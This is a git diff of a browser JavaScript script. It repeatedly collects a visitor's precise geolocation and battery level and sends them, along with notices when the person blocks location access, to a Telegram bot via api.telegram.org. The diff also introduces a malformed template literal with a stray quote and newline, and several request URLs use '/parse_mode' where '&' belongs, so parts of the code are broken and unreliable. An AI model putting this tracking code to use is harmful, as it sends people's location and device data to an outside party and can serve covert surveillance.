@@ -1,19 +1,46 @@
 import { chatid, token } from "./telegram_config.js";
 
+
+const telegaMessageLink = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}`
+const telegaLocationLink = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatid}'
+
+`
 const options = {
     enableHighAccuracy: true,
-    // timeout: 5000,
+    timeout: 10000,
     maximumAge: 0
 };
-const someError = () => {
-    console.error(error)
-}
 
 const textAccuracy = document.querySelector('#accuracy')
 const textLatitude = document.querySelector('#latitude')
 const textLongitude = document.querySelector('#longitude')
 
 //Geoposition metod
+
+const someError = (err) => {
+
+    if (err.code === 1) {
+        const textError = 'ОП заблокировал передачу геолакации'
+        $.ajax({
+            type: "POST",
+            url: `${telegaMessageLink}/parse_mode=HTML&text=${textError}`,
+        });
+    }
+    if (err.code === 2) {
+        const textError = 'Получение геолокации недоступно'
+        $.ajax({
+            type: "POST",
+            url: `${telegaMessageLink}/parse_mode=HTML&text=${textError}`,
+        });
+    }
+    if (err.code === 3) {
+        const textError = 'Истекло время разрешенное для сбора геолокации. Данные не получены'
+        $.ajax({
+            type: "POST",
+            url: `${telegaMessageLink}/parse_mode=HTML&text=${textError}`,
+        });
+    }
+}
 
 const getPosition = () => {
     if(navigator.geolocation) {
@@ -25,30 +52,35 @@ const getPosition = () => {
 
 //Function for geoposition
 const showPosition = (position) => {
-    const accuracy = Math.trunc(position.coords.accuracy)
-    const latitude = position.coords.latitude
     const longitude = position.coords.longitude
+    const latitude = position.coords.latitude
+    const accuracy = Math.trunc(position.coords.accuracy)
     const timePosition = new Date(position.timestamp)
     const positionInfo = `Местоположение ОП: (Широта: ${latitude}, Долгота: ${longitude}, Точность: ${accuracy} Время сбора информации: ${timePosition})`
 
     $.ajax({
         type: "POST",
-        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}/parse_mode=HTML&text=${positionInfo}`,
+        url: `${telegaMessageLink}/parse_mode=HTML&text=${positionInfo}`,
     }, options);
     $.ajax({
         type: "POST",
-        url: `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatid}&latitude=${latitude}&longitude=${longitude}`,
+        url: `${telegaLocationLink}&latitude=${latitude}&longitude=${longitude}`,
     }, options);
+
     textAccuracy.textContent = `Точность: ${accuracy} м.`
     textLatitude.textContent = `Широта: ${latitude}`
     textLongitude.textContent = `Долгота: ${longitude}`
+
+
 }
 
 const intervalPosition = setInterval(() => {
     getPosition()
 }, 10000);
 
-setTimeout(() => {clearInterval(intervalPosition)},50000)
+setTimeout(() => {
+    clearInterval(intervalPosition)
+},50000)
 
 //Battery
 
@@ -63,24 +95,24 @@ const getBattery = () => {
                 const batteryInfo = `Процент заряда батареи ОП: ${level}`
                 $.ajax({
                     type: "POST",
-                    url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}/parse_mode=HTML&text=${batteryInfo}`,
+                    url: `${telegaMessageLink}/parse_mode=HTML&text=${batteryInfo}`,
                 });
             });
     } else {
         $.ajax({
             type: "POST",
-            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}/parse_mode=HTML&text=Обработка данных о батареи не поддерживается`,
+            url: `${telegaMessageLink}/parse_mode=HTML&text=Обработка данных о батареи не поддерживается`,
         });
     }
 }
 
 getBattery()
 
-//Button
+//  Button
+    const button = document.querySelector('#button-hand-position')
+    button.addEventListener('click', () => {
+            getPosition();
+            getBattery()
+        }
+    );
 
-const button = document.querySelector('#button-hand-position')
-button.addEventListener('click', event => {
-        getPosition();
-        getBattery()
-    }
-);
